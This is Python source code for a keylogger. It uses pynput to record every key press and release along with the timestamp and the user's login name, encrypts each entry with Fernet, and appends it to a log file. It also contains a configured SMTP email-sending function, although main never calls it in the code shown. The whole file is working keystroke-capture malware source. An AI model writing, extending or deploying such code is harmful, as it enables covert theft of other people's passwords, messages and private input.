import os
import sys
import time
import smtplib
import configparser
import logging
from cryptography.fernet import Fernet
from pynput.keyboard import Key, Listener
# Setup logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(levelname)s - %(message)s'
)
logger = logging.getLogger(__name__)
# Configuration management
CONFIG_FILE = 'config.ini'
def load_config():
    """Load configuration from file."""
    config = configparser.ConfigParser()
    try:
        config.read(CONFIG_FILE)
        return {
            'email': {
                'from': config.get('email', 'from'),
                'to': config.get('email', 'to'),
                'password': config.get('email', 'password'),
                'smtp_server': config.get('email', 'smtp_server'),
                'smtp_port': config.getint('email', 'smtp_port')
            },
            'logging': {
                'dir': config.get('logging', 'dir'),
                'file': config.get('logging', 'file')
            },
            'encryption': {
                'key': config.get('encryption', 'key')
            }
        }
    except Exception as e:
        logger.error(f"Failed to load configuration: {e}")
        sys.exit(1)
def setup_directories(log_dir):
    """Ensure required directories exist."""
    try:
        if not os.path.exists(log_dir):
            os.makedirs(log_dir)
    except Exception as e:
        logger.error(f"Failed to create directory {log_dir}: {e}")
        sys.exit(1)
def send_email(config, subject, body):
    """Send an email with the given subject and body."""
    try:
        server = smtplib.SMTP(
            config['email']['smtp_server'],
            config['email']['smtp_port']
        )
        server.starttls()
        server.login(
            config['email']['from'],
            config['email']['password']
        )
        message = f"Subject: {subject}\n\n{body}"
        server.sendmail(
            config['email']['from'],
            config['email']['to'],
            message
        )
        server.quit()
        logger.info("Email sent successfully")
    except Exception as e:
        logger.error(f"Failed to send email: {e}")
def on_press(key, config, cipher):
    """Handle key press events."""
    try:
        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        user = os.getlogin()
        data = f"{timestamp} {user} pressed {key}\n"
        encrypted_data = cipher.encrypt(data.encode())
        with open(log_path, 'ab') as f:
            f.write(encrypted_data + b'\n')
    except Exception as e:
        logger.error(f"Failed to log key press: {e}")
def on_release(key, config, cipher):
    """Handle key release events."""
    try:
        log_path = os.path.join(config['logging']['dir'], config['logging']['file'])
        timestamp = time.strftime("%Y-%m-%d %H:%M:%S")
        user = os.getlogin()
        data = f"{timestamp} {user} released {key}\n"
        encrypted_data = cipher.encrypt(data.encode())
        with open(log_path, 'ab') as f:
            f.write(encrypted_data + b'\n')
        if key == Key.esc:
            return False  # Stop listener
    except Exception as e:
        logger.error(f"Failed to log key release: {e}")
def main():
    """Main application entry point."""
    try:
        config = load_config()
        setup_directories(config['logging']['dir'])
        cipher = Fernet(config['encryption']['key'].encode())
        logger.info("Starting keylogger...")
        with Listener(
            on_press=lambda key: on_press(key, config, cipher),
            on_release=lambda key: on_release(key, config, cipher)
        ) as listener:
            listener.join()
    except KeyboardInterrupt:
        logger.info("Keylogger stopped by user")
    except Exception as e:
        logger.error(f"Fatal error: {e}")
        sys.exit(1)
if __name__ == "__main__":
    main()